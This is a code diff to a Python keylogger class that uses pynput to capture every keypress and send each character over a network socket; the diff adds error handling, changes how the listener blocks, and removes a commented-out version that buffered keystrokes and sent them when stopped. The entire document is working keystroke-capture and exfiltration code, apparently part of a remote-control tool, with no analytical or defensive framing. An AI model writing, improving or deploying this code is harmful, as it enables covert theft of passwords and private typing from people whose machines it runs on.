@@ -2,62 +2,38 @@ from pynput import keyboard
 
 class Keylogger:
     def __init__(self, client_socket):
-        self.key = None
-        self.listener = None
         self.conn = client_socket
-    
+        self.listener = None
+
     def start(self):
-        # create keyboard listener
-        self.listener = keyboard.Listener(on_press=self.log)
+        try:
+            # Create a keyboard listener
+            self.listener = keyboard.Listener(on_press=self.log)
 
-        # start the keyboard listener
-        self.listener.start()
+            # Start the keyboard listener in a separate thread
+            self.listener.start()
 
-        # wait for user input
-        input()
+            # Wait for user input to stop the keylogger
+            self.listener.join()
+        except Exception as e:
+            print(f"Error: {e}")
 
     def log(self, key):
-        # send char over socklet to client
-        self.conn.send(str(key.char).encode())
+        try:
+            # Send the character over the socket to the client
+            if hasattr(key, "char"):
+                self.conn.send(str(key.char).encode())
+        except Exception as e:
+            print(f"Error while logging: {e}")
 
-    # remove listeners and close connection
     def stop(self):
-        self.listener.stop()
-        self.listener = None
-        self.conn.close()
-
-
-# from pynput import keyboard
-
-# class Keylogger:
-#     def __init__(self, client_socket):
-#         self.conn = client_socket
-#         self.listener = None
-#         self.logging = False
-#         self.keys = []
-
-#     def start(self):
-#         self.listener = keyboard.Listener(on_press=self.on_key_press)
-#         self.logging = True
-#         self.keys = []
-#         self.listener.start()
-
-#     def on_key_press(self, key):
-#         try:
-#             char = key.char
-#         except AttributeError:
-#             if key == keyboard.Key.esc:
-#                 self.stop()
-#                 return
-#             char = f'[{str(key)}]'
-
-#         self.keys.append(char)
-
-#     def stop(self):
-#         if self.logging:
-#             self.listener.stop()
-#             self.logging = False
-#             self.conn.send("".join(self.keys).encode())
-
-#     def is_logging(self):
-#         return self.logging
+        try:
+            if self.listener:
+                # Stop the keyboard listener
+                self.listener.stop()
+                self.listener.join()
+            if self.conn:
+                # Close the connection
+                self.conn.close()
+        except Exception as e:
+            print(f"Error while stopping: {e}")
